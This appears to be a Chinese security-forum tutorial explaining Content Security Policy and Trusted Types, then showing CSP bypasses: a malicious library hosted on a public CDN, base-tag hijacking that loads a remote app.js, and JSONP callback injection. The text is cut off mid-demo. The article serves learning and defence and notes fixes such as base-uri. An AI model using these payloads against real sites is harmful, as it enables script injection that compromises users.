---
title: 当XSS遇上CSP与mXSS：绕过技巧与底层逻辑
url: https://forum.butian.net/share/4535
source: 奇安信攻防社区
date: 2025-09-10
fetch_date: 2025-10-02T19:53:36.174240
---

# 当XSS遇上CSP与mXSS：绕过技巧与底层逻辑

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 当XSS遇上CSP与mXSS：绕过技巧与底层逻辑

* [漏洞分析](https://forum.butian.net/topic/48)

在现代 Web 安全体系中，跨站脚本攻击（XSS）虽然已经是一个“老生常谈”的话题，但随着浏览器安全策略和防护手段的不断更新，XSS 的绕过技术也在持续演化。本文系统梳理了常见的 XSS 绕过思路，重点介绍了 内容安全策略（CSP）的绕过方法、混合 XSS（mXSS）的成因与利用，并结合实际案例分析其背后的实现原理。通过从机制层面理解这些绕过方式，读者不仅能够更清晰地认识 Web 安全防护的局限性，还能在攻防对抗中掌握更有效的思路。

引言
==
在学习apache的confusion攻击中无意翻到了huli师傅的blog，发现XSS真的是一个很好玩的东西，并且现在很多CTF国际赛以及国外的SRC平台都挺重视XSS的，于是便学习了
CSP
===
CSP，全名为Content Security Policy，可以翻作「内容安全政策」，意思就是你可以帮自己的网页订立一些规范，跟浏览器说我的网页只允许符合这个规则的内容，不符合的都帮我挡掉。
在网页上加载CSP有三种方式：
- HTTP response header `Content-Security-Policy`
- `<meta>`标签
- `<iframe>`的csp 属性，huli师傅没有给出外链，可能需要后期自己补了
一个例子: ```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src 'none'">
</head>
<body>
<script>alert(1)</script>
CSP test
</body>
</html>
```
如果要用到HTTP harder，可以写在中间件配置中，这里以nginx为例
```nginx
add\_header Content-Security-Policy "script-src 'none'";
```
其中，`"script-src" 'none'`就是当前页面不会执行js-script
CSP的规则
------
CSP的定义就是diretive+rule
最重要的一个叫做`default-src`，就是预设的规则，例如说没有设置`script-src`，那就会用`default-src`的内容，但要注意的是有几种指示不会fallback 到`default-src`，如`base-uri`或是`form-action`等等，完整列表可以看这边：[The default-src Directive](https://content-security-policy.com/default-src/)
常见的diretive有这些
1. `script-src`：管理JavaScript
2. `style-src`：管理CSS
3. `font-src`：管理字体
4. `img-src`：管理图片
5. `connect-src`：管理连线（fetch、XMLHttpRequest 以及WebSocket 等等）
6. `media-src`：管理video 跟audio 等等
7. `frame-src`：管理frame 以及iframe 等等
8. `base-uri`：管理`<base>`的使用
9. `form-action`：管理表单的action
10. `frame-ancestors`：管理页面可以被谁嵌入
11. `report-uri`：待会再讲
12. `navigate-to`：管理页面可以跳转到的地方
基本上常见的规则有以下几种：
1. `\*`，允许除了`data:`跟`blob:`还有`filesystem:`以外所有的URL
2. `'none'`，什么都不允许
3. `'self'`，只允许same-origin 的资源
4. `https:`，允许所有HTTPS 的资源
5. `example.com`，允许特定domain（HTTP 跟HTTPS 都可以）
6. `https://example.com`，允许特定origin（只允许HTTPS） 细说script-src 的规则
----------------
除了以上的规则以外，还有其他的规则也可以使用，例如设置完CSP之后，预设的是禁止inline-Script和`eval`进行执行的，其中inline-script包括：
7. `<script>`标签里面直接放程式码（应该要用`<script src>`从外部引入）
8. `onclick`这种写在HTML 里面的event handler
9. `javascript:`伪协议
而eval就是类似于setTimeout这种可以把字符执行的命令。
对应这两个unline-src用来指定unsafe-inline，unsafe-eval则用来指定eval类的代码。
除了这些之外，还有`'nonce-xxx'`，意思是在后端产生一个随机字串，例如说`a2b5zsa19c`好了，那有带上`nonce=a2b5zsa19c`的script 标签就可以载入：
```html
<!-- 允許 -->
<script nonce=a2b5zsa19c>
alert(1)
</script>
<!-- 不允許 -->
<script>
alert(1)
</script>
```
同样的我们也可以用hash值来做这种字串
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script 'sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='">
<!-- 其中这里一串的值是经过alert(1)的sha256+base64过来的 -->
</head>
<script nonce ='sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='>
alert(1)
</script>
<!-- 不允許 -->
<script>alert(2)</script>
<!-- 多一個空格也不允許，因為 hash 值不同 -->
<script>alert(1) </script>
<!-- 允许 -->
<script>alert(1)</script>
```
之后还有一个"script-dynamic",动态的执行限制，看到这个脚本应该能明白
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-rjg103rj1298e' 'strict-dynamic'">
</head>
<body>
<script nonce=rjg103rj1298e>
const element = document.createElement('script')
element.src = 'https://example.com'
document.body.appendChild(element)
</script>
</body>
</html>
```
一个问题：
如果说你发现你的网站加载的script都来自https://unpkg.com,那么这样子写CSP合理吗
```php
Content-Security-Policy: script-src https://unpkg.com;
```
Trusted Types
=============
在这里，我看见了之前没有见过的新名词，因为他现在还在test阶段
这个东西是干嘛的呢，他会将未处理过的字符串进行抛出Exception，你可以这样子使用它,强制浏览器在插入HTML 时一定要先经过Trusted Types 的处理：
```php
Content-Security-Policy: require-trusted-types-for 'script';
```
当你正常的写一个程序的时候
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'">
</head>
<body>
<div id=content></div>
<script>
document.querySelector("#content").innerHTML = '<h1>hello</h1>'
</script>
</body>
</html>
```
本身来看，并没有什么触发安全的问题，但是会抛出Exception
```php
This document requires 'TrustedHTML' assignment. Uncaught TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.
```
当强制启用Trusted Types 以后，就不能直接丢一个字串给`innerHTML`，而是要创立一个新的Trusted Types policy 来处理危险的HTML，用法是这样的：
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'">
</head>
<body>
<div id=content></div>
<script>
// 新增一個 policy
const sanitizePolicy = trustedTypes.createPolicy('sanitizePolicy', {
// 決定你要怎麼做 sanitize/escape
createHTML: (string) => string
.replace(/</g, "&lt;")
.replace(/>/g, '&gt;')
});
// 回傳的 safeHtml 型態為 TrustedHTML，不是字串
const safeHtml = sanitizePolicy.createHTML('<h1>hello</h1>')
document.querySelector("#content").innerHTML = safeHtml
</script>
</body>
</html>
```
Bypass手法
========
Bypass CSP
----------
### Unsafe domain
如果你的网站上面有用到一些公开的CDN 平台来载入JS，像是[unpkg.com](https://unpkg.com/)之类的，有可能会直接把CSP 的规则设定成：`script-src https://unpkg.com`。
这个时候，因为CDN平台是公开的，如果有人上传了恶意的library，那么到你这个地方就可以直接使用，而针对这种情形，已经有人写了一个叫做[csp-bypass](https://github.com/CanardMandarin/csp-bypass)的library 并且上传上去，来看个范例：
```js
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src https://unpkg.com/">
</head>
<body>
<div id=userContent>
<script src="https://unpkg.com/react@16.7.0/umd/react.production.min.js"></script>
<script src="https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js"></script>
<br csp="alert(1)">
</div>
</body>
</html>
```
所以第一个绕过方法就是看有没有这种写好的bypass library在公开的CDN里面
### Base绕过
在设定CSP 时，一个常见的做法是利用nonce 来指定哪些script 可以载入，就算被攻击者注入HTML，在不知道nonce 的前提下他也无法执行脚本
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-abc123';">
</head>
<body>
<div id=userContent>
<script src="https://example.com/my.js"></script>
</div>
<script nonce=abc123 src="app.js"></script>
</body>
</html>
```
这个时候我们一眼看上去没什么问题，因为这里用了nonce来限制script了，default-src也设置为none了，但是有一个标签他并不会被限制住就是`<base>`，例如`<base href="https://example.com/">`，他的意思就是，改变所有相对路径的参考，例如上面的app.js，如果写成这个样子
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-abc123';">
</head>
<body>
<div id=userContent>
<base href="https://example.com/">
</div>
<script nonce=abc123 src="app.js"></script>
</body>
</html>
```
就相当于加载了`https://example.com/app.js`的文件，也就是如果我们把base改为远程地址，然后upload一个app.js，就可以直接执行代码了。
阻止这个绕过方式的解法是在CSP 中加上`base-uri`的规则，例如说用`base-uri 'none'`阻挡所有的base 标签。由于大多数网站应该都没有需要用到`<base>`的需求，可以大胆地加上这个指示。
### JSONP
JSONP 是一种能够跨来源取得资料的方式。
一般来说浏览器会阻止你跟非同源的网页互动，例如说在`https://blog.huli.tw`中执行：`fetch('https://example.com')`也就是没办法直接用fetch拿到别的网页的东西，但是有些标签类似于`<img>`这种本身就可以加载外部资源的标签并不会收到CORS的限制。
于是，出现了一种用API或者说是可以feedback的一种函数，例如`https://example.com/api/users`我们可以从这个url中得到这些信息
```php
setUsers([
{id: 1, name: 'user01'},
{id: 2, name: 'user02'}
])
```
那么我们就可以这样子去拿到资料
```php
<script>
function setUsers(users) {
console.log('Users from api:', users)
}
</script>
<script src="https://example.com/api/users"></script>
```
并且后面进化成`https://example.com/api/users?callback=anyFunctionName`这样子去调用
```php
anyFunctionName([
{id: 1, name: 'user01'},
{id: 2, name: 'user02'}
])
```
那么如果我们调用的方式是这样子`https://example.com/api/users?callback=alert(1);console.log`则拼接后就是
```php
alert(1);console.log([
{id: 1, name: 'user01'},
{id: 2, name: 'user02'}
])
```
#### 小demo
```html
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src https://www.google.com https://www.gstatic.com">
</head>
<body>
<div id=userCo...